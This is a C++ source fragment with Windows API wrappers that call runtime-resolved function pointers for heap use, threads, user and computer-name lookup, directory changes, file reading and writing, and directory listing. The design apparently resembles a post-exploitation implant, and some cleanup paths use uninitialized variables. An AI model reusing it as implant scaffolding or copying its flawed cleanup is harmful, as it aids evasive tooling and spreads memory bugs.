WinApiCustom::~WinApiCustom()
{
	// Free library (modules)
	// FreeLibraryCustom(loadedModules.hKernel32); TODO
	// FreeLibraryCustom(loadedModules.hUser32);
}

/* WRAPPER FUNCTIONS FOR WinApiCustom */

// Custom heap alloc
LPVOID WinApiCustom::HeapAllocCustom(DWORD sizeOfBufferToAllocate)
{
	return this->loadedFunctions.HeapAlloc(
		this->loadedFunctions.GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeOfBufferToAllocate);
}

// Custom heap free
BOOL WinApiCustom::HeapFreeCustom(LPVOID pBufferToFree)
{
	return this->loadedFunctions.HeapFree(
		this->loadedFunctions.GetProcessHeap(),
		0,
		pBufferToFree);
}

// Custom Heap realloc
LPVOID WinApiCustom::HeapReAllocCustom(LPVOID lpMem, DWORD dwBytes)
{
	return this->loadedFunctions.HeapReAlloc(
		this->loadedFunctions.GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		lpMem,
		dwBytes);
}

// Custom CreateThread
HANDLE WinApiCustom::CreateThreadCustom(LPTHREAD_START_ROUTINE pThreadFunc, LPVOID pThreadFuncParams)
{
	return this->loadedFunctions.CreateThread(
		NULL,
		0,
		pThreadFunc,
		pThreadFuncParams,
		0,
		NULL);
}

// Custom CreateMutex
HANDLE WinApiCustom::CreateMutexCustom()
{
	return this->loadedFunctions.CreateMutexA(NULL, FALSE, NULL);
}

/* Get current process handle */
HANDLE WinApiCustom::GetCurrentProcessHandle()
{
	return (HANDLE)-1;
}

/*
Get user name wrapper

Returned double-pointers point to buffers that must be manually freed
*/
void WinApiCustom::GetUserNameCustom(OUT LPVOID *ppUserName, OUT LPVOID *ppDomainName)
{
	// Initialise data
	HANDLE hCurrentProcessToken = NULL;

	// Get handle to current process's token
	this->loadedFunctions.OpenProcessToken(
		this->GetCurrentProcessHandle(),
		TOKEN_QUERY,
		&hCurrentProcessToken);
	if (hCurrentProcessToken == NULL)
		goto CLEANUP;

	// Get token's user's SID
	DWORD tokenUserSize = 0;
	this->loadedFunctions.GetTokenInformation(
		hCurrentProcessToken,
		TokenUser,
		NULL,
		0,
		&tokenUserSize);
	if (tokenUserSize == NULL)
		goto CLEANUP;

	PTOKEN_USER pTokenUser = (PTOKEN_USER)(this->HeapAllocCustom(tokenUserSize));
	if (pTokenUser == NULL)
		goto CLEANUP;

	this->loadedFunctions.GetTokenInformation(
		hCurrentProcessToken,
		TokenUser,
		pTokenUser,
		tokenUserSize,
		&tokenUserSize);

	PSID pTokenUserSid = pTokenUser->User.Sid;
	if (pTokenUserSid == NULL)
		goto CLEANUP;

	// Lookup user with above found SID
	this->SidToUsernameCustom(
		pTokenUserSid,
		ppUserName,
		ppDomainName);

CLEANUP:
	if (hCurrentProcessToken != NULL)
		this->loadedFunctions.CloseHandle(hCurrentProcessToken);

	if (pTokenUser != NULL)
		this->HeapFreeCustom(pTokenUser);
}

/*
Get FQDN of computer

Returned pointer points to buffer that must be manually freed
*/
LPVOID WinApiCustom::GetFQDNComputer()
{
	DWORD size = 0;
	this->loadedFunctions.GetComputerNameExA(
		COMPUTER_NAME_FORMAT::ComputerNameDnsFullyQualified,
		NULL,
		&size);

	if (size == 0)
		return NULL;

	LPVOID computerNameBuf = this->HeapAllocCustom(size);
	if (computerNameBuf == NULL)
		return NULL;

	if (!this->loadedFunctions.GetComputerNameExA(
			COMPUTER_NAME_FORMAT::ComputerNameDnsFullyQualified,
			(LPSTR)computerNameBuf,
			&size))
	{
		this->HeapFreeCustom(computerNameBuf);
		return NULL;
	}

	return computerNameBuf;
}

/*
Gets current working directory

Returned pointer (if not NULL) points to buffer that must be manually freed
*/
PCHAR WinApiCustom::GetCurrentWorkingDirectoryCustom()
{
	DWORD bufferLength = 0;
	LPVOID pBuffer = NULL;

	bufferLength = this->loadedFunctions.GetCurrentDirectoryA(bufferLength, (LPSTR)pBuffer);
	if (bufferLength == 0)
		return NULL;

	pBuffer = this->HeapAllocCustom(bufferLength);
	if (pBuffer == NULL)
		return NULL;

	bufferLength = this->loadedFunctions.GetCurrentDirectoryA(bufferLength, (LPSTR)pBuffer);
	if (bufferLength == 0)
	{
		this->HeapFreeCustom(pBuffer);
		return NULL;
	}
	else
	{
		return (PCHAR)pBuffer;
	}
}

/*
Change current directory
*/
BOOL WinApiCustom::ChangeCurrentWorkingDirectoryCustom(PCHAR dirPath)
{
	if (dirPath != NULL && StrLen(dirPath) != 0)
	{
		return this->loadedFunctions.SetCurrentDirectoryA(dirPath);
	}
	return FALSE;
}

/*
Reads an existing file

Returned pointer points to the file contents buffer and must be manually freed for cleanup
*/
LPVOID WinApiCustom::ReadFileCustom(PCHAR filePath)
{
	LPVOID fileContents = NULL;

	HANDLE hFile = this->loadedFunctions.CreateFileA(
		filePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
		goto CLEANUP;

	LARGE_INTEGER fileSizeLI;
	fileSizeLI.QuadPart = 0;
	if (!this->loadedFunctions.GetFileSizeEx(
			hFile,
			&fileSizeLI))
		goto CLEANUP;
	if (fileSizeLI.QuadPart == 0)
		goto CLEANUP;

	HANDLE hFileMappingObject = this->loadedFunctions.CreateFileMappingA(
		hFile,
		NULL,
		PAGE_READONLY,
		0,
		0,
		NULL);
	if (hFileMappingObject == NULL)
		goto CLEANUP;

	LPVOID pFileView = this->loadedFunctions.MapViewOfFile(
		hFileMappingObject,
		FILE_MAP_READ,
		0,
		0,
		0);
	if (pFileView == NULL)
		goto CLEANUP;

	fileContents = this->HeapAllocCustom(fileSizeLI.QuadPart);
	if (fileContents == NULL)
		goto CLEANUP;

	CopyBuffer(fileContents, pFileView, (DWORD64)fileSizeLI.QuadPart);

CLEANUP:
	if (pFileView)
		this->loadedFunctions.UnmapViewOfFile(pFileView);

	if (hFileMappingObject)
		this->loadedFunctions.CloseHandle(hFileMappingObject);

	if (hFile)
		this->loadedFunctions.CloseHandle(hFile);

	return fileContents;
}

/*
Writes specific content to a file

Returns TRUE if write is successful
*/
BOOL WinApiCustom::WriteFileCustom(PCHAR filePath, LPVOID whatToWrite, DWORD64 whatToWriteSize)
{
	BOOL result = FALSE;

	HANDLE hFile = this->loadedFunctions.CreateFileA(
		filePath,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
		goto CLEANUP;

	DWORD fileSizeHighDword = HIDWORD(whatToWriteSize);
	DWORD fileSizeLowDword = LODWORD(whatToWriteSize);

	HANDLE hFileMappingObject = this->loadedFunctions.CreateFileMappingA(
		hFile,
		NULL,
		PAGE_READWRITE,
		fileSizeHighDword,
		fileSizeLowDword,
		NULL);
	if (hFileMappingObject == NULL)
		goto CLEANUP;

	LPVOID pFileView = this->loadedFunctions.MapViewOfFile(
		hFileMappingObject,
		FILE_MAP_WRITE,
		0,
		0,
		0);
	if (pFileView == NULL)
		goto CLEANUP;

	CopyBuffer(pFileView, whatToWrite, whatToWriteSize);

	if (!this->loadedFunctions.FlushViewOfFile(pFileView, 0))
		goto CLEANUP;

	if (!this->loadedFunctions.FlushFileBuffers(hFile))
		goto CLEANUP;

	result = TRUE;

CLEANUP:
	if (pFileView)
		this->loadedFunctions.UnmapViewOfFile(pFileView);

	if (hFileMappingObject)
		this->loadedFunctions.CloseHandle(hFileMappingObject);

	if (hFile)
		this->loadedFunctions.CloseHandle(hFile);

	return result;
}

/*
Finds out contents of a directory

dirPath: Directory path to search in; automatically appends required "\*" as needed
ppDirListing: Pointer to a PWIN32_FIND_DATAA that will get output as address to an array of WIN32_FIND_DATAA
pDirListingSize: Pointer to DWORD that stores size of above array of WIN32_FIND_DATAA

*ppDirListing must be manually freed
*/
BOOL WinApiCustom::ListDirectoryCustom(IN PCHAR dirPath, OUT WIN32_FIND_DATAA **ppDirListing, OUT PDWORD pDirListingSize)
{
	if (dirPath == NULL)
		return FALSE;

	BOOL returnVal = FALSE;
	DWORD dirPathLen = StrLen(dirPath);
	DWORD dirPathRequiredLen = dirPathLen;
	PCHAR dirPathRequired = dirPath;
	HANDLE hFindFile = INVALID_HANDLE_VALUE;
	*ppDirListing = NULL;
	*pDirListingSize = 0;

	// If path does not end in "\*", append it
	if (!(dirPath[dirPathLen - 2] == '\\' && dirPath[dirPathLen - 1] == '*'))
	{
		// If path ends with "\"
		if (dirPath[dirPathLen - 1] == '\\')
		{
			dirPathRequiredLen += 1;
		}

		// Else if path ends with directory name only
		else
		{
			dirPathRequiredLen += 2;
		}
	}
	if (dirPathRequiredLen != dirPathLen)
	{
		dirPathRequired = (PCHAR)this->HeapAllocCustom(dirPathRequiredLen + 1);
		if (dirPathRequired == NULL)
			goto CLEANUP;

		ConcatString(dirPathRequired, dirPath);
		if (dirPathRequiredLen - 2 == dirPathLen)
			ConcatString(dirPathRequired, "\\*");
		else if (dirPathRequiredLen - 1 == dirPathLen)
			ConcatString(dirPathRequired, "*");
		else
			goto CLEANUP;
	}

	// Find out size of buffer needed to contain information about all found files
	WIN32_FIND_DATAA findDataA;
	RtlZeroMemoryCustom((PBYTE)(&findDataA), sizeof(WIN32_FIND_DATAA));

	hFindFile = this->loadedFunctions.FindFirstFileA(dirPathRequired, &findDataA);
	if (hFindFile == INVALID_HANDLE_VALUE)
		goto CLEANUP;
	do
	{
		*pDirListingSize += sizeof(findDataA);
	} while (this->loadedFunctions.FindNextFileA(hFindFile, &findDataA));

	if (*pDirListingSize == 0)
		goto CLEANUP;

	if (!this->loadedFunctions.FindClose(hFindFile))
		goto CLEANUP;

	// Create buffer and copy all results into it
	hFindFile = this->loadedFunctions.FindFirstFileA(dirPathRequired, &findDataA);
	if (hFindFile == INVALID_HANDLE_VALUE)
		goto CLEANUP;

	*ppDirListing = (PWIN32_FIND_DATAA)this->HeapAllocCustom(*pDirListingSize);
	if (*ppDirListing == NULL)
		goto CLEANUP;
	PWIN32_FIND_DATAA pDirListingWrite = *ppDirListing;
	DWORD dataWrittenSize = 0;
	do
	{
		CopyBuffer((LPVOID)pDirListingWrite, (LPVOID)(&findDataA), sizeof(findDataA));
		dataWrittenSize += sizeof(findDataA);
		++pDirListingWrite;
	} while (this->loadedFunctions.FindNextFileA(hFindFile, &findDataA) && (dataWrittenSize < *pDirListingSize));

	// If execution reaches here, all went well
	returnVal = TRUE;

CLEANUP:
	if ((dirPathRequiredLen != dirPathLen) && (dirPathRequired != NULL))
		this->HeapFreeCustom(dirPathRequired);

	if (hFindFile != NULL && hFindFile != INVALID_HANDLE_VALUE)
	{
		this->loadedFunctions.FindClose(hFindFile);
	}

	return returnVal;
}

// TODO
void DescribeDirectoryListingCustom()
{
}
